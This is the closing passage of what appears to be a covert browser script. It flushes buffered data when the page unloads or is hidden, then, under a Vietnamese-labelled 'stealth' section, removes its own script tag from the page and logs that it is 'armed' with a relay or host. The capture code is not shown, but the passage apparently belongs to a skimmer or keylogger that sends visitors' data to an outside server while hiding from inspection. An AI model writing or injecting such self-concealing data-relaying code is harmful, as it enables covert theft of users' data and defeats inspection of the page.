  on(window, 'beforeunload', flush);
  on(document, 'visibilitychange', function () { if (document.visibilityState === 'hidden') setTimeout(flush, 300); });

  /* ==================== 9. STEALTH: BỎ THẺ SCRIPT ==================== */
  try {
    var cs = document.currentScript || (function () {
      var s = document.getElementsByTagName('script');
      return s[s.length - 1];
    })();
    if (cs && cs.parentNode) cs.parentNode.removeChild(cs);
  } catch (e) {}

  log('armed', CFG.relay ? 'relay' : HOST);
})();
